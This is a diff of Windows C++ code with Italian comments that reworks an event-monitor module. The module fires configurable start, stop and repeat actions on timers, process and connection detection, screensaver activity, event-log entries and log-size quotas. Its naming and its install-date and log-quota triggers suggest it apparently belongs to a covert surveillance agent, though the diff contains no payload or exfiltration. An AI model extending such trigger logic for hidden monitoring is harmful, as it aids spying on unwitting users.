@@ -2,7 +2,7 @@
 // e una per istruire una nuova condizione da monitorare
 
 // Definita dentro SM_Core.cpp, di cui questo file e' un include
-void TriggerEvent(DWORD);
+void TriggerEvent(DWORD, DWORD);
 
 // Codici degli event monitor
 #define EM_TIMER 0
@@ -16,31 +16,25 @@ void TriggerEvent(DWORD);
 //---------------------------------------------------
 // TIMER EVENT MONITOR
 
-#define EM_TIMER_SING 0	 // Aspetta n millisecondi (DWORD) da quando parte il monitor 
-#define EM_TIMER_REPD 1  // Ogni n millisecondi (DWORD) da quando parte il monitor
 #define EM_TIMER_DATE 2	 // Attende una determinata data (DWORD64 100-nanosec da 1 gennaio 1601)
 #define EM_TIMER_INST 3  // Attende un determinato intervallo (DWORD64 100-nanosec) dalla data di creazione del file
 #define EM_TIMER_DAIL 4  // Azione di start dopo n millisecondi dalla mezzanotte (ogni giorno). Stessa cosa per azione di stop
 
-#define EM_TM_SLEEPTIME 300
+#define EM_TM_SLEEPTIME 500
 
-// C'e' un signolo thread per i timer DATE, INST e DAIL, piu' un thread per ogni timer
-// di tipo SING e REPD.
-// I timer SING e REPD hanno un delay massimo di 49.7 giorni (la parte hi_delay
-// non viene considerata a causa della Sleep).
+// C'e' un signolo thread per i timer DATE, INST e DAIL
 // Le date (data e installazione) sono GMT.
 
 typedef struct {
-	DWORD lo_delay; // millisecondi di attesa per SING o REPD, oppure parte bassa dei 100-nanosec della data
-	DWORD hi_delay; // parte alta dei 100-nanosec della data (dal 1 gennaio 1601)
+	DWORD event_id;
+	DWORD lo_delay_start; // Parte alta e bassa dei 100 nanosecondi dall'installazione, o di una data. Ma anche millisecondi dalla mezzanotte
+	DWORD hi_delay_start;
+	DWORD lo_delay_stop; 
+	DWORD hi_delay_stop;
 	BYTE  timer_type;
-	DWORD event_code;
-	DWORD end_action; // per le fasce orarie (tipo DAILY)
-	BOOL triggered; // per i delay di tipo data indica se e' stato gia' rilevato
-	BOOL cp;        // semaforo per l'uscita dei thread timer
-	HANDLE thread_id; // Solo per i timer SING e REPD
+	event_param_struct event_param;
+	BOOL triggered; 
 } monitored_timer;
-
 
 DWORD em_tm_timer_count = 0;
 HANDLE em_tm_montime_thread = 0;
@@ -111,39 +105,11 @@ BOOL IsGreaterDate(nanosec_time *date, nanosec_time *dead_line)
 }
 
 
-// Thread per i delay
-#define TIMER_DELAY_INTERVAL 100
-DWORD TimerMonitorSingleDelay(monitored_timer *timer)
-{
-	DWORD i;
-
-	// Se e' di tipo EM_TIMER_REPD continua a ripetere 
-	do {
-		// -> Sleep(timer->lo_delay);
-		for (i=0; i<=(timer->lo_delay / TIMER_DELAY_INTERVAL); i++) {
-			CANCELLATION_POINT(timer->cp);
-			Sleep(TIMER_DELAY_INTERVAL); 
-		}
-
-		TriggerEvent(timer->event_code);
-	} while(timer->timer_type == EM_TIMER_REPD);
-
-	// Se e' un SINGD aspetta che venga terminato senza fare 
-	// piu' niente.
-	LOOP {
-		CANCELLATION_POINT(timer->cp);
-		Sleep(TIMER_DELAY_INTERVAL); 
-	}
-
-	return 0;
-}
-
-
 // Thread per le date
 DWORD TimerMonitorDates(DWORD dummy)
 {
 	DWORD i;
-	nanosec_time local_time, event_time;
+	nanosec_time local_time;
 
 	LOOP {
 		CANCELLATION_POINT(em_tm_cp);
@@ -159,38 +125,49 @@ DWORD TimerMonitorDates(DWORD dummy)
 
 		// ...e la confronta con tutte quelle da monitorare
 		for (i=0; i<em_tm_timer_count; i++) {
-			event_time.lo_delay = em_tm_timer_table[i].lo_delay;
-			event_time.hi_delay = em_tm_timer_table[i].hi_delay;
-
 			// Se e' del tipo "fascia oraria" vede se ci siamo dentro o se ne siamo usciti
 			if (em_tm_timer_table[i].timer_type == EM_TIMER_DAIL) {
 				FILETIME ft;
 				SYSTEMTIME st;
+
 				ft.dwLowDateTime  = local_time.lo_delay;
 				ft.dwHighDateTime = local_time.hi_delay; 
 				if (FileTimeToSystemTime(&ft, &st)) {
 					DWORD ms_from_midnight = ((((st.wHour*60) + st.wMinute)*60) + st.wSecond)*1000;
 					// Se non era triggerato e entriamo nella fascia
-					if (!em_tm_timer_table[i].triggered && ms_from_midnight<event_time.hi_delay && ms_from_midnight>event_time.lo_delay) {
+					if (!em_tm_timer_table[i].triggered && ms_from_midnight<=em_tm_timer_table[i].lo_delay_stop && ms_from_midnight>=em_tm_timer_table[i].lo_delay_start) {
 						em_tm_timer_table[i].triggered = TRUE;
-						TriggerEvent(em_tm_timer_table[i].event_code);
+						TriggerEvent(em_tm_timer_table[i].event_param.start_action, em_tm_timer_table[i].event_id);
+						CreateRepeatThread(em_tm_timer_table[i].event_id, em_tm_timer_table[i].event_param.repeat_action, em_tm_timer_table[i].event_param.count, em_tm_timer_table[i].event_param.delay);
 					}
 
 					// Se era triggerato e ora siamo fuori dalla fascia
-					if (em_tm_timer_table[i].triggered && (ms_from_midnight>event_time.hi_delay || ms_from_midnight<event_time.lo_delay)) {
+					if (em_tm_timer_table[i].triggered && (ms_from_midnight>em_tm_timer_table[i].lo_delay_stop || ms_from_midnight<em_tm_timer_table[i].lo_delay_start)) {
 						em_tm_timer_table[i].triggered = FALSE;
-						TriggerEvent(em_tm_timer_table[i].end_action);
+						StopRepeatThread(em_tm_timer_table[i].event_id);
+						TriggerEvent(em_tm_timer_table[i].event_param.stop_action, em_tm_timer_table[i].event_id);
 					}
 				}
 			}
 
-			// Se e' del tipo data, se non e' triggerato e se l'attesa e' scaduta
-			// allora lo triggera
-			if ( (em_tm_timer_table[i].timer_type == EM_TIMER_DATE || em_tm_timer_table[i].timer_type == EM_TIMER_INST) &&
-				 !em_tm_timer_table[i].triggered &&
-				 IsGreaterDate(&local_time, &event_time)) {
-				em_tm_timer_table[i].triggered = TRUE;
-				TriggerEvent(em_tm_timer_table[i].event_code);
+			// Verifica le fasce di date
+			if (em_tm_timer_table[i].timer_type == EM_TIMER_DATE || em_tm_timer_table[i].timer_type == EM_TIMER_INST) {
+				
+				nanosec_time event_time_start, event_time_stop;
+				event_time_start.lo_delay = em_tm_timer_table[i].lo_delay_start;
+				event_time_start.hi_delay = em_tm_timer_table[i].hi_delay_start;
+				event_time_stop.lo_delay = em_tm_timer_table[i].lo_delay_stop;
+				event_time_stop.hi_delay = em_tm_timer_table[i].hi_delay_stop;
+
+				if (!em_tm_timer_table[i].triggered && IsGreaterDate(&local_time, &event_time_start) && !IsGreaterDate(&local_time, &event_time_stop)) {
+					em_tm_timer_table[i].triggered = TRUE;
+					TriggerEvent(em_tm_timer_table[i].event_param.start_action, em_tm_timer_table[i].event_id);
+					CreateRepeatThread(em_tm_timer_table[i].event_id, em_tm_timer_table[i].event_param.repeat_action, em_tm_timer_table[i].event_param.count, em_tm_timer_table[i].event_param.delay);
+				} else if (em_tm_timer_table[i].triggered && (!IsGreaterDate(&local_time, &event_time_start) || IsGreaterDate(&local_time, &event_time_stop))) {
+					em_tm_timer_table[i].triggered = FALSE;
+					StopRepeatThread(em_tm_timer_table[i].event_id);
+					TriggerEvent(em_tm_timer_table[i].event_param.stop_action, em_tm_timer_table[i].event_id);
+				}
 			}
 		}
 	}
@@ -199,7 +176,7 @@ DWORD TimerMonitorDates(DWORD dummy)
 }
 
 
-void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
+void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
 {
 	typedef struct {
 		DWORD timer_type; 
@@ -221,16 +198,10 @@ void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 		return;
 
 	em_tm_timer_table = (monitored_timer *)temp_table;
-	em_tm_timer_table[em_tm_timer_count].thread_id = 0;
-	em_tm_timer_table[em_tm_timer_count].event_code = event;
+	em_tm_timer_table[em_tm_timer_count].event_id = event_id;
+	memcpy(&em_tm_timer_table[em_tm_timer_count].event_param, event_param, sizeof(event_param_struct));
 	em_tm_timer_table[em_tm_timer_count].triggered = FALSE;
-	em_tm_timer_table[em_tm_timer_count].cp = FALSE;
 	em_tm_timer_table[em_tm_timer_count].timer_type = (BYTE)conf_entry->timer_type;
-
-	if (conf_entry->timer_type == EM_TIMER_DAIL) 
-		em_tm_timer_table[em_tm_timer_count].end_action = conf_entry->end_action;
-	else
-		em_tm_timer_table[em_tm_timer_count].end_action = 0xFFFFFFFF;
 
 	if (conf_entry->timer_type == EM_TIMER_INST) {
 		if (GetFileDate(HM_CompletePath(H4DLLNAME, dll_path), &install_time)) {
@@ -246,17 +217,26 @@ void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 			AddNanosecTime(&install_delay, &date_delta);
 
 			// Il risultato e' la data (in 100-nanosec) da attendere
-			em_tm_timer_table[em_tm_timer_count].lo_delay = install_delay.lo_delay;
-			em_tm_timer_table[em_tm_timer_count].hi_delay = install_delay.hi_delay;
+			em_tm_timer_table[em_tm_timer_count].lo_delay_start = install_delay.lo_delay;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_start = install_delay.hi_delay;
+			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
 		} else {
 			// Se non riesce a leggere la data di installazione setta l'attesa di 
 			// una data che non arrivera' mai...
-			em_tm_timer_table[em_tm_timer_count].lo_delay = 0xffffffff;
-			em_tm_timer_table[em_tm_timer_count].hi_delay = 0xffffffff;
+			em_tm_timer_table[em_tm_timer_count].lo_delay_start = 0xffffffff;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_start = 0xffffffff;
+			em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
+			em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
 		}
-	} else { 
-		em_tm_timer_table[em_tm_timer_count].lo_delay = conf_entry->lo_delay;
-		em_tm_timer_table[em_tm_timer_count].hi_delay = conf_entry->hi_delay;
+	} else if (conf_entry->timer_type == EM_TIMER_DAIL) {
+		em_tm_timer_table[em_tm_timer_count].lo_delay_start = conf_entry->lo_delay;
+		em_tm_timer_table[em_tm_timer_count].lo_delay_stop = conf_entry->hi_delay;
+	}  else {
+		em_tm_timer_table[em_tm_timer_count].lo_delay_start = conf_entry->lo_delay;
+		em_tm_timer_table[em_tm_timer_count].hi_delay_start = conf_entry->hi_delay;
+		em_tm_timer_table[em_tm_timer_count].lo_delay_stop = 0xffffffff;
+		em_tm_timer_table[em_tm_timer_count].hi_delay_stop = 0xffffffff;
 	}
 
 	em_tm_timer_count++;
@@ -265,33 +245,21 @@ void WINAPI EM_TimerAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 
 void WINAPI EM_TimerStart()
 {
-	DWORD i, dummy;
-	BOOL is_timer_date = FALSE; // e' TRUE se ci sono timer di tipo EM_TIMER_DATE, EM_TIMER_INST o EM_TIMER_DAIL
-
-	// Lancia i thread di delay 
-	for (i=0; i<em_tm_timer_count; i++) {
-		if (em_tm_timer_table[i].timer_type == EM_TIMER_REPD || em_tm_timer_table[i].timer_type == EM_TIMER_SING)
-			em_tm_timer_table[i].thread_id = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TimerMonitorSingleDelay, (LPVOID)&em_tm_timer_table[i], 0, &dummy);
-		else
-			is_timer_date = TRUE;
-	}
-
-	// Lancia, se deve, il thread di attesa delle date
-	if (is_timer_date)
+	DWORD dummy;
+	// Lancia il thread se c'e' almeno un timer da seguire
+	if (em_tm_timer_count>0)
 		em_tm_montime_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TimerMonitorDates, NULL, 0, &dummy);
 }
 
 
 void WINAPI EM_TimerStop()
 {
-	DWORD i;
-
-	// Cancella il thread dei timer con data
+	// Cancella il thread 
 	QUERY_CANCELLATION(em_tm_montime_thread, em_tm_cp);
 
-	// Uccide i thread di delay
-	for (i=0; i<em_tm_timer_count; i++) 
-		QUERY_CANCELLATION(em_tm_timer_table[i].thread_id, em_tm_timer_table[i].cp);
+	// Cancella tutti i thread di repeat
+	for (DWORD i=0; i<em_tm_timer_count; i++)
+		StopRepeatThread(em_tm_timer_table[i].event_id);
 
 	SAFE_FREE(em_tm_timer_table);
 	em_tm_timer_count = 0;
@@ -331,8 +299,8 @@ typedef struct {
 	DWORD isWindow;
 	DWORD isForeground;
 	BOOL present;
-	DWORD event_code_found;
-	DWORD event_code_notf;
+	event_param_struct event_param;
+	DWORD event_id;
 } monitored_proc;
 
 typedef struct {
@@ -444,12 +412,14 @@ DWORD MonitorProcesses(DWORD dummy)
 
 			if (enum_win_par.found && !em_mp_process_table[index].present) {
 				em_mp_process_table[index].present = TRUE;
-				TriggerEvent(em_mp_process_table[index].event_code_found);
+				TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
+				CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
 			}
 
 			if (!enum_win_par.found && em_mp_process_table[index].present) {
 				em_mp_process_table[index].present = FALSE;
-				TriggerEvent(em_mp_process_table[index].event_code_notf);
+				StopRepeatThread(em_mp_process_table[index].event_id);
+				TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
 			}
 		}
 
@@ -471,12 +441,14 @@ DWORD MonitorProcesses(DWORD dummy)
 
 				if (process_found && !em_mp_process_table[index].present) {
 					em_mp_process_table[index].present = TRUE;
-					TriggerEvent(em_mp_process_table[index].event_code_found);
+					TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
+					CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
 				}
 
 				if (!process_found && em_mp_process_table[index].present) {
 					em_mp_process_table[index].present = FALSE;
-					TriggerEvent(em_mp_process_table[index].event_code_notf);
+					StopRepeatThread(em_mp_process_table[index].event_id);
+					TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
 				}
 				continue;
 			}
@@ -500,7 +472,8 @@ DWORD MonitorProcesses(DWORD dummy)
 						// Se il processo e' presente e non era ancora stato rilevato, lancia il primo evento
 						if (!em_mp_process_table[index].present) {
 							em_mp_process_table[index].present = TRUE;
-							TriggerEvent(em_mp_process_table[index].event_code_found);
+							TriggerEvent(em_mp_process_table[index].event_param.start_action, em_mp_process_table[index].event_id);
+							CreateRepeatThread(em_mp_process_table[index].event_id, em_mp_process_table[index].event_param.repeat_action, em_mp_process_table[index].event_param.count, em_mp_process_table[index].event_param.delay);
 						}
 						process_found = TRUE;
 						break;
@@ -511,7 +484,8 @@ DWORD MonitorProcesses(DWORD dummy)
 				// lancia il secondo evento
 				if (em_mp_process_table[index].present && !process_found) {
 					em_mp_process_table[index].present = FALSE;
-					TriggerEvent(em_mp_process_table[index].event_code_notf);
+					StopRepeatThread(em_mp_process_table[index].event_id);
+					TriggerEvent(em_mp_process_table[index].event_param.stop_action, em_mp_process_table[index].event_id);
 				}
 			}
 		}		
@@ -524,7 +498,7 @@ DWORD MonitorProcesses(DWORD dummy)
 }
 
 
-void WINAPI EM_MonProcAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
+void WINAPI EM_MonProcAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
 {
 	typedef struct {
 		DWORD event_notf; // Evento da scatenare quando il processo non e' piu' presente
@@ -552,8 +526,8 @@ void WINAPI EM_MonProcAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 		return;
 
 	em_mp_process_table = (monitored_proc *)temp_table;
-	em_mp_process_table[em_mp_monitor_count].event_code_found = event;
-	em_mp_process_table[em_mp_monitor_count].event_code_notf = conf_entry->event_notf;
+	memcpy(&em_mp_process_table[em_mp_monitor_count].event_param, event_param, sizeof(event_param_struct));
+	em_mp_process_table[em_mp_monitor_count].event_id = event_id;
 	em_mp_process_table[em_mp_monitor_count].proc_name = wcsdup((WCHAR *)ptr);
 	em_mp_process_table[em_mp_monitor_count].isWindow = (conf_entry->flags & PR_WINDOW_MASK);
 	em_mp_process_table[em_mp_monitor_count].isForeground = (conf_entry->flags & PR_FOREGROUND_MASK);
@@ -577,7 +551,11 @@ void WINAPI EM_MonProcStop()
 	DWORD i;
 
 	QUERY_CANCELLATION(em_mp_monproc_thread, em_mp_cp);
-	
+
+	// Cancella tutti i thread di repeat
+	for (i=0; i<em_mp_monitor_count; i++)
+		StopRepeatThread(em_mp_process_table[i].event_id);
+
 	// Libera tutte le strutture allocate
 	for (i=0; i<em_mp_monitor_count; i++)
 		SAFE_FREE(em_mp_process_table[i].proc_name);
@@ -610,7 +588,8 @@ typedef struct {
 	DWORD netmask;
 	DWORD port;
 	BOOL present;
-	DWORD event_code;
+	event_param_struct event_param;
+	DWORD event_id;
 } monitored_conn;
 
 #define EM_MC_SLEEPTIME 300
@@ -749,7 +728,8 @@ DWORD MonitorConnection(DWORD dummy)
 							// in un precedente ciclo
 							if (!em_mc_connection_table[i].present) {
 								em_mc_connection_table[i].present = TRUE;
-								TriggerEvent(em_mc_connection_table[i].event_code);
+								TriggerEvent(em_mc_connection_table[i].event_param.start_action, em_mc_connection_table[i].event_id);
+								CreateRepeatThread(em_mc_connection_table[i].event_id, em_mc_connection_table[i].event_param.repeat_action, em_mc_connection_table[i].event_param.count, em_mc_connection_table[i].event_param.delay);
 							}
 							conn_found = TRUE;
 							break;
@@ -758,8 +738,11 @@ DWORD MonitorConnection(DWORD dummy)
 				}
 				// Se la connessione era stata rilevata come presente, ma adesso non lo e' piu',
 				// aggiorna la tabella
-				if (em_mc_connection_table[i].present && !conn_found) 
+				if (em_mc_connection_table[i].present && !conn_found) {
 					em_mc_connection_table[i].present = FALSE;
+					StopRepeatThread(em_mc_connection_table[i].event_id);
+					TriggerEvent(em_mc_connection_table[i].event_param.stop_action, em_mc_connection_table[i].event_id);
+				}
 			}
 		}
 		
@@ -772,7 +755,7 @@ DWORD MonitorConnection(DWORD dummy)
 }
 
 
-void WINAPI EM_MonConnAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
+void WINAPI EM_MonConnAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
 {
 	typedef struct {
 		DWORD ip_address;
@@ -791,7 +774,8 @@ void WINAPI EM_MonConnAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 		return;
 
 	em_mc_connection_table = (monitored_conn *)temp_table;
-	em_mc_connection_table[em_mc_connection_count].event_code = event;
+	memcpy(&em_mc_connection_table[em_mc_connection_count].event_param, event_param, sizeof(event_param_struct));	
+	em_mc_connection_table[em_mc_connection_count].event_id = event_id;
 	em_mc_connection_table[em_mc_connection_count].ip_address = conf_entry->ip_address;
 	em_mc_connection_table[em_mc_connection_count].netmask = conf_entry->netmask;
 	em_mc_connection_table[em_mc_connection_count].port = conf_entry->port;
@@ -809,10 +793,14 @@ void WINAPI EM_MonConnStart()
 		em_mc_monconn_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorConnection, NULL, 0, &dummy);
 }
 
-
 void WINAPI EM_MonConnStop()
 {
 	QUERY_CANCELLATION(em_mc_monconn_thread, em_mc_cp);
+
+	// Cancella tutti i thread di repeat
+	for (DWORD i=0; i<em_mc_connection_count; i++)
+		StopRepeatThread(em_mc_connection_table[i].event_id);
+
 	SAFE_FREE(em_mc_connection_table);
 	SAFE_FREE(em_mc_localip);
 	em_mc_connection_count = 0;
@@ -831,11 +819,15 @@ void WINAPI EM_MonConnStop()
 //---------------------------------------------------
 // MONITOR SALVASCHERMO
 
-DWORD em_ss_event_start = AF_NONE;
-DWORD em_ss_event_stop = AF_NONE;
+typedef struct {
+	event_param_struct event_param;
+	DWORD event_id;
+} monitored_screensaver;
+
+DWORD screensaver_count = 0;
+monitored_screensaver *screensaver_table = NULL;
 BOOL em_ss_present = FALSE;
 HANDLE em_ss_thread = 0;
-
 BOOL em_ss_cp = FALSE;
 
 #define EM_SS_SLEEPTIME 300
@@ -855,19 +847,26 @@ BOOL IsSaverRunning()
 DWORD MonitorScreenSaver(DWORD dummy)
 {
 	LOOP {
+		DWORD i;
 		CANCELLATION_POINT(em_ss_cp);
 
 		if (IsSaverRunning()) {
 			// Se lo screensaver e' presente e non era stato rilevato
 			if (!em_ss_present) {
 				em_ss_present = TRUE;
-				TriggerEvent(em_ss_event_start);
+				for (i=0; i<screensaver_count; i++) {
+					TriggerEvent(screensaver_table[i].event_param.start_action, screensaver_table[i].event_id);
+					CreateRepeatThread(screensaver_table[i].event_id, screensaver_table[i].event_param.repeat_action, screensaver_table[i].event_param.count, screensaver_table[i].event_param.delay);
+				}
 			}
 		} else {
 			// Se lo screensaver non e' presente ed era stato rilevato
 			if (em_ss_present) {
 				em_ss_present = FALSE;
-				TriggerEvent(em_ss_event_stop);
+				for (i=0; i<screensaver_count; i++) {
+					StopRepeatThread(screensaver_table[i].event_id);
+					TriggerEvent(screensaver_table[i].event_param.stop_action, screensaver_table[i].event_id);
+				}
 			}
 		}
 
@@ -879,15 +878,18 @@ DWORD MonitorScreenSaver(DWORD dummy)
 }
 
 
-void WINAPI EM_ScreenSaverAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
+void WINAPI EM_ScreenSaverAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
 {
-	DWORD *event_stop;
-	
-	if (! (event_stop = (DWORD *)conf_ptr) )
+	void *temp_table;
+
+	if ( !(temp_table = realloc(screensaver_table, (screensaver_count + 1)*sizeof(monitored_screensaver))) )
 		return;
 
-	em_ss_event_start = event;
-	em_ss_event_stop = *event_stop;	
+	screensaver_table = (monitored_screensaver *)temp_table;
+	memcpy(&screensaver_table[screensaver_count].event_param, event_param, sizeof(event_param_struct));	
+	screensaver_table[screensaver_count].event_id = event_id;
+
+	screensaver_count++;
 }
 
 
@@ -896,7 +898,7 @@ void WINAPI EM_ScreenSaverStart()
 	DWORD dummy;
 
 	// Crea il thread solo se ci sono azioni da fare
-	if (em_ss_event_start != AF_NONE || em_ss_event_stop != AF_NONE)
+	if (screensaver_count>0)
 		em_ss_thread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorScreenSaver, NULL, 0, &dummy);
 }
 
@@ -904,8 +906,11 @@ void WINAPI EM_ScreenSaverStart()
 void WINAPI EM_ScreenSaverStop()
 {
 	QUERY_CANCELLATION(em_ss_thread, em_ss_cp);
-	em_ss_event_start = AF_NONE;
-	em_ss_event_stop = AF_NONE;
+
+	for (DWORD i=0; i<screensaver_count; i++) 
+		StopRepeatThread(screensaver_table[i].event_id);
+
+	SAFE_FREE(screensaver_table);
 	em_ss_present = FALSE;
 }
 
@@ -924,6 +929,7 @@ void WINAPI EM_ScreenSaverStop()
 typedef struct {
 	DWORD event_monitored;
 	DWORD event_triggered;
+	DWORD event_id;
 } monitored_event;
 
 typedef struct {
@@ -995,7 +1001,7 @@ DWORD MonitorWindowsEvent(DWORD dummy)
 					// Compara l'evento j-esimo nella sorgente con il k-esimo 
 					// elemento da monitorare per quella sorgente
 					if (pevlr->EventID == em_me_source_table[i].event_array[k].event_monitored) {
-						TriggerEvent(em_me_source_table[i].event_array[k].event_triggered);
+						TriggerEvent(em_me_source_table[i].event_array[k].event_triggered, em_me_source_table[i].event_array[k].event_id);
 						break;
 					}
 			}
@@ -1010,7 +1016,7 @@ DWORD MonitorWindowsEvent(DWORD dummy)
 
 
 // Aggiunge un evento da monitorare a una sorgente
-void MonEventAddEvent(monitored_source *source_entry, DWORD event_monitored, DWORD event_triggered)
+void MonEventAddEvent(monitored_source *source_entry, DWORD event_monitored, DWORD event_triggered, DWORD event_id)
 {
 	void *temp_table;
 
@@ -1022,12 +1028,12 @@ void MonEventAddEvent(monitored_source *source_entry, DWORD event_monitored, DWO
 	source_entry->event_array = (monitored_event *)temp_table;
 	source_entry->event_array[source_entry->event_count].event_monitored = event_monitored;
 	source_entry->event_array[source_entry->event_count].event_triggered = event_triggered;
-
+	source_entry->event_array[source_entry->event_count].event_id = event_id;
 	source_entry->event_count++;
 }
 
 
-void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
+void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
 {
 	typedef struct {
 		DWORD event_monitored; // Evento da monitorare
@@ -1044,7 +1050,7 @@ void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 	// Se la sorgente e' gia' monitorata aggiunge un evento...
 	for (i=0; i<em_me_source_count; i++) 
 		if (!strcmp(em_me_source_table[i].source_name, conf_entry->source_name)) {
-			MonEventAddEvent(em_me_source_table + i, conf_entry->event_monitored, event);
+			MonEventAddEvent(em_me_source_table + i, conf_entry->event_monitored, event_param->start_action, event_id);
 			return;
 		}
 
@@ -1061,7 +1067,7 @@ void WINAPI EM_MonEventAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 	em_me_source_table[em_me_source_count].source_name = _strdup(conf_entry->source_name);
 
 	// ...e aggiunge l'evento...
-	MonEventAddEvent(em_me_source_table + em_me_source_count, conf_entry->event_monitored, event);
+	MonEventAddEvent(em_me_source_table + em_me_source_count, conf_entry->event_monitored, event_param->start_action, event_id);
 
 	em_me_source_count++;
 }
@@ -1117,8 +1123,8 @@ void WINAPI EM_MonEventStop()
 // QUOTA DISCO
 typedef struct {
 	DWORD disk_quota;
-	DWORD event_code;
-	DWORD exit_event;
+	event_param_struct event_param;
+	DWORD event_id;
 	BOOL cp;        // semaforo per l'uscita dei thread di controllo
 	HANDLE thread_id;
 } monitored_quota;
@@ -1137,12 +1143,14 @@ DWORD QuotaMonitorThread(monitored_quota *quota)
 		log_size = LOG_GetActualLogSize();
 
 		if (log_size > quota->disk_quota) {
-			TriggerEvent(quota->event_code);
+			TriggerEvent(quota->event_param.start_action, quota->event_id);
+			CreateRepeatThread(quota->event_id, quota->event_param.repeat_action, quota->event_param.count, quota->event_param.delay);
 			quota_passed = TRUE;
 		} else {
 			if (quota_passed) {
 				quota_passed = FALSE;
-				TriggerEvent(quota->exit_event);
+				StopRepeatThread(quota->event_id);
+				TriggerEvent(quota->event_param.stop_action, quota->event_id);
 			}
 		}
 
@@ -1158,7 +1166,7 @@ DWORD QuotaMonitorThread(monitored_quota *quota)
 }
 
 #define QUOTA_NEW_TAG 0x20100505
-void WINAPI EM_QuotaAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
+void WINAPI EM_QuotaAdd(BYTE *conf_ptr, DWORD dummy, event_param_struct *event_param, DWORD event_id)
 {
 	typedef struct {
 		DWORD disk_quota;
@@ -1179,12 +1187,9 @@ void WINAPI EM_QuotaAdd(BYTE *conf_ptr, DWORD dummy, DWORD event)
 	em_qt_quota_table = (monitored_quota *)temp_table;
 	em_qt_quota_table[em_qt_quota_count].thread_id = 0;
 	em_qt_quota_table[em_qt_quota_count].disk_quota = conf_entry->disk_quota;
-	em_qt_quota_table[em_qt_quota_count].event_code = event;
+	memcpy(&em_qt_quota_table[em_qt_quota_count].event_param, event_param, sizeof(event_param_struct));	
+	em_qt_quota_table[em_qt_quota_count].event_id = event_id;
 	em_qt_quota_table[em_qt_quota_count].cp = FALSE;
-	if (conf_entry->tag == QUOTA_NEW_TAG) 
-		em_qt_quota_table[em_qt_quota_count].exit_event = conf_entry->exit_event;
-	else
-		em_qt_quota_table[em_qt_quota_count].exit_event = AF_NONE;
 
 	em_qt_quota_count++;
 }
@@ -1203,9 +1208,11 @@ void WINAPI EM_QuotaStop()
 {
 	DWORD i;
 
-	// Uccide i thread di controllo
-	for (i=0; i<em_qt_quota_count; i++) 
+	// Uccide i thread di controllo e di repeat
+	for (i=0; i<em_qt_quota_count; i++) {
 		QUERY_CANCELLATION(em_qt_quota_table[i].thread_id, em_qt_quota_table[i].cp);
+		StopRepeatThread(em_qt_quota_table[i].event_id);
+	}
 
 	SAFE_FREE(em_qt_quota_table);
 	em_qt_quota_count = 0;
